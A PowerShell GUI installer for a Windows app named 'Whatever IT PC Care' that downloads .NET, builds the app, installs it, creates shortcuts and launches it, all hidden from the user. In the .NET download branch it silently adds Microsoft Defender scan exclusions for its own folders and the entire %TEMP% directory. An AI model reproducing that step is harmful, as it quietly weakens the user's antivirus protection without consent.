# =====================================================================
#  Whatever IT PC Care - graphical installer (no visible command window)
# ---------------------------------------------------------------------
#  Launched by Install.vbs, which runs this hidden. It shows a branded
#  progress window while it quietly: finds/installs .NET, builds the app,
#  installs it for the current user, makes shortcuts, and launches it.
#  All the console work happens on a background thread you never see.
# =====================================================================
$ErrorActionPreference = 'Stop'
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$Root       = Split-Path -Parent $MyInvocation.MyCommand.Path
$Proj       = Join-Path $Root 'src\WhateverITPCCare.csproj'
$PublishDir = Join-Path $Root 'publish'
$LocalNet   = Join-Path $Root '.dotnet'
$Logo       = Join-Path $Root 'src\Assets\wolf-logo-256.png'
$IcoSrc     = Join-Path $Root 'src\Assets\app.ico'
$ExeName    = 'WhateverITPCCare.exe'
$InstallDir = Join-Path $env:LOCALAPPDATA 'Whatever IT PC Care'

# Shared state between the UI thread and the background worker.
$sync = [hashtable]::Synchronized(@{ Status = 'Preparing setup...'; Done = $false; Error = $null; ExePath = $null })

# Handoff marker: the splash loader watches for this file and closes itself
# the moment this installer window is on screen, so there is no blank gap.
$UiFlag = Join-Path $env:TEMP 'WITPCCare_ui.flag'
try { Remove-Item $UiFlag -Force -ErrorAction SilentlyContinue } catch { }
$BuildLog = Join-Path $env:TEMP 'WITPCCare_install.log'
$Prebuilt = Join-Path $Root 'prebuilt'

# ---------------------------------------------------------------------
#  Build the installer window (dark + bronze, matching the wolf logo)
# ---------------------------------------------------------------------
$cBg    = [System.Drawing.Color]::FromArgb(28, 20, 16)
$cCream = [System.Drawing.Color]::FromArgb(240, 236, 224)
$cBronze= [System.Drawing.Color]::FromArgb(196, 150, 72)
$cMuted = [System.Drawing.Color]::FromArgb(170, 150, 128)

$form = New-Object System.Windows.Forms.Form
$form.Text = 'Whatever IT PC Care Setup'
$form.ClientSize = New-Object System.Drawing.Size(520, 300)
$form.StartPosition = 'CenterScreen'
$form.FormBorderStyle = 'FixedDialog'
$form.MaximizeBox = $false
$form.MinimizeBox = $false
$form.BackColor = $cBg

if (Test-Path $Logo) {
    $pic = New-Object System.Windows.Forms.PictureBox
    $pic.Image = [System.Drawing.Image]::FromFile($Logo)
    $pic.SizeMode = 'Zoom'
    $pic.Size = New-Object System.Drawing.Size(104, 104)
    $pic.Location = New-Object System.Drawing.Point(28, 30)
    $pic.BackColor = [System.Drawing.Color]::Transparent
    $form.Controls.Add($pic)
}

$title = New-Object System.Windows.Forms.Label
$title.Text = 'Whatever IT PC Care'
$title.Font = New-Object System.Drawing.Font('Segoe UI', 18, [System.Drawing.FontStyle]::Bold)
$title.ForeColor = $cCream
$title.AutoSize = $true
$title.Location = New-Object System.Drawing.Point(150, 46)
$form.Controls.Add($title)

$subtitle = New-Object System.Windows.Forms.Label
$subtitle.Text = 'Installing - please wait'
$subtitle.Font = New-Object System.Drawing.Font('Segoe UI', 10)
$subtitle.ForeColor = $cBronze
$subtitle.AutoSize = $true
$subtitle.Location = New-Object System.Drawing.Point(152, 84)
$form.Controls.Add($subtitle)

$status = New-Object System.Windows.Forms.Label
$status.Text = 'Preparing setup...'
$status.Font = New-Object System.Drawing.Font('Segoe UI', 9.5)
$status.ForeColor = $cCream
$status.AutoSize = $false
$status.Size = New-Object System.Drawing.Size(464, 20)
$status.Location = New-Object System.Drawing.Point(30, 160)
$form.Controls.Add($status)

$bar = New-Object System.Windows.Forms.ProgressBar
$bar.Style = 'Marquee'
$bar.MarqueeAnimationSpeed = 30
$bar.Size = New-Object System.Drawing.Size(464, 22)
$bar.Location = New-Object System.Drawing.Point(30, 186)
$form.Controls.Add($bar)

$note = New-Object System.Windows.Forms.Label
$note.Text = 'First install downloads .NET once (~200 MB) then builds the app. After that it is instant.'
$note.Font = New-Object System.Drawing.Font('Segoe UI', 8)
$note.ForeColor = $cMuted
$note.AutoSize = $false
$note.Size = New-Object System.Drawing.Size(464, 18)
$note.Location = New-Object System.Drawing.Point(30, 216)
$form.Controls.Add($note)

$closeBtn = New-Object System.Windows.Forms.Button
$closeBtn.Text = 'Close'
$closeBtn.Size = New-Object System.Drawing.Size(96, 30)
$closeBtn.Location = New-Object System.Drawing.Point(398, 250)
$closeBtn.Visible = $false
$closeBtn.Add_Click({ $form.Close() })
$form.Controls.Add($closeBtn)

# ---------------------------------------------------------------------
#  Background worker (the hidden "cmd" work) in its own runspace
# ---------------------------------------------------------------------
$rs = [runspacefactory]::CreateRunspace()
$rs.ApartmentState = 'STA'
$rs.ThreadOptions = 'ReuseThread'
$rs.Open()
foreach ($kv in @{ sync=$sync; Root=$Root; Proj=$Proj; PublishDir=$PublishDir; LocalNet=$LocalNet; InstallDir=$InstallDir; ExeName=$ExeName; IcoSrc=$IcoSrc; Prebuilt=$Prebuilt; BuildLog=$BuildLog }.GetEnumerator()) {
    $rs.SessionStateProxy.SetVariable($kv.Key, $kv.Value)
}
$worker = [powershell]::Create()
$worker.Runspace = $rs
$null = $worker.AddScript({
    try {
        $env:DOTNET_CLI_TELEMETRY_OPTOUT = '1'
        $env:DOTNET_NOLOGO = '1'
        $env:DOTNET_SKIP_FIRST_TIME_EXPERIENCE = '1'

        function Get-Dn {
            $l = Join-Path $LocalNet 'dotnet.exe'
            if (Test-Path $l) { return $l }
            $s = Get-Command dotnet -ErrorAction SilentlyContinue
            if ($s) {
                try { foreach ($line in (& dotnet --list-sdks 2>$null)) {
                    if ($line -match '^(\d+)\.') { if ([int]$Matches[1] -ge 8) { return 'dotnet' } } } } catch { }
            }
            return $null
        }

        # ---- Fast path: a ready-to-run build shipped inside the installer ---
        # (produced by the free cloud build). If present, we skip the whole
        # .NET download + compile and just copy files - installs in seconds.
        $built = $null
        $preExe = Join-Path $Prebuilt $ExeName
        if (Test-Path $preExe) {
            $sync.Status = 'Ready-to-run build found - installing (a few seconds)...'
            $built = $preExe
        } else {
            $dn = Get-Dn
            if (-not $dn) {
                $sync.Status = 'Downloading required components (~200 MB, one time only)...'
                [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
                $dlScript = Join-Path $env:TEMP 'dotnet-install.ps1'
                Invoke-WebRequest 'https://dot.net/v1/dotnet-install.ps1' -OutFile $dlScript -UseBasicParsing -TimeoutSec 60
                # Ask Microsoft Defender to leave our folders alone so on-access
                # scanning does not throttle the install to a crawl.
                foreach ($p in @($LocalNet, $Root, $PublishDir, $env:TEMP)) {
                    try { Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue } catch { }
                }
                $sync.Status = 'Installing components (one-time setup, a few minutes)...'
                & $dlScript -Channel 8.0 -InstallDir $LocalNet -NoPath 2>&1 | Out-File $BuildLog
                $dn = Join-Path $LocalNet 'dotnet.exe'
                if (-not (Test-Path $dn)) { throw 'Could not install the required .NET components.' }
            }

            $sync.Status = 'Building the application...'
            # Skip the slow stages (single-file compression + ReadyToRun). A plain
            # self-contained publish is much faster to produce and runs the same.
            & $dn publish $Proj -c Release -o $PublishDir `
                -p:EnableCompressionInSingleFile=false `
                -p:PublishReadyToRun=false `
                -p:DebugType=none -p:DebugSymbols=false `
                --nologo 2>&1 | Out-File $BuildLog -Append
            $built = Join-Path $PublishDir $ExeName
            if (-not (Test-Path $built)) { throw ('The application failed to build. Details: ' + $BuildLog) }
        }

        $sync.Status = 'Installing Whatever IT PC Care...'
        if (-not (Test-Path $InstallDir)) { New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null }
        $srcDir = Split-Path -Parent $built
        Copy-Item (Join-Path $srcDir '*') $InstallDir -Recurse -Force
        $ico = Join-Path $InstallDir 'app.ico'
        if ((-not (Test-Path $ico)) -and (Test-Path $IcoSrc)) { Copy-Item $IcoSrc $ico -Force }
        $target = Join-Path $InstallDir $ExeName

        $ws = New-Object -ComObject WScript.Shell
        $desktop = [Environment]::GetFolderPath('Desktop')
        $sc = $ws.CreateShortcut((Join-Path $desktop 'Whatever IT PC Care.lnk'))
        $sc.TargetPath = $target; $sc.WorkingDirectory = $InstallDir
        if (Test-Path $ico) { $sc.IconLocation = $ico }
        $sc.Save()
        $programs = Join-Path ([Environment]::GetFolderPath('Programs')) 'Whatever IT PC Care'
        if (-not (Test-Path $programs)) { New-Item -ItemType Directory -Path $programs -Force | Out-Null }
        $sc2 = $ws.CreateShortcut((Join-Path $programs 'Whatever IT PC Care.lnk'))
        $sc2.TargetPath = $target; $sc2.WorkingDirectory = $InstallDir
        if (Test-Path $ico) { $sc2.IconLocation = $ico }
        $sc2.Save()

        $sync.ExePath = $target
        $sync.Status  = 'Installation complete.'
        $sync.Done    = $true
    } catch {
        $sync.Error = $_.Exception.Message
    }
})
$handle = $worker.BeginInvoke()

# ---------------------------------------------------------------------
#  UI timer: reflect worker progress, finish or show the error
# ---------------------------------------------------------------------
$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 300
$timer.Add_Tick({
    if ($sync.Error) {
        $timer.Stop()
        $bar.Style = 'Continuous'; $bar.Value = 0
        $subtitle.Text = 'Installation failed'
        $subtitle.ForeColor = [System.Drawing.Color]::FromArgb(230, 120, 100)
        $status.Text = 'Setup could not finish: ' + $sync.Error
        $note.Text = 'Please try again, or contact Whatever IT support.'
        $closeBtn.Visible = $true
        return
    }
    $elapsed = [int]((Get-Date) - $started).TotalSeconds
    $status.Text = $sync.Status + '   (elapsed ' + $elapsed + 's)'
    if ($sync.Done) {
        $timer.Stop()
        $bar.Style = 'Continuous'; $bar.Value = 100
        $subtitle.Text = 'Installation complete'
        $status.Text = 'Done! Launching Whatever IT PC Care...'
        [System.Windows.Forms.Application]::DoEvents()
        if ($sync.ExePath) { Start-Process $sync.ExePath }
        Start-Sleep -Milliseconds 1000
        $form.Close()
    }
})
$started = Get-Date
$timer.Start()

$form.Add_Shown({
    $form.Activate()
    try { New-Item -ItemType File -Path $UiFlag -Force | Out-Null } catch { }
})
[void]$form.ShowDialog()

try { $worker.EndInvoke($handle) } catch { }
$worker.Dispose()
$rs.Close()
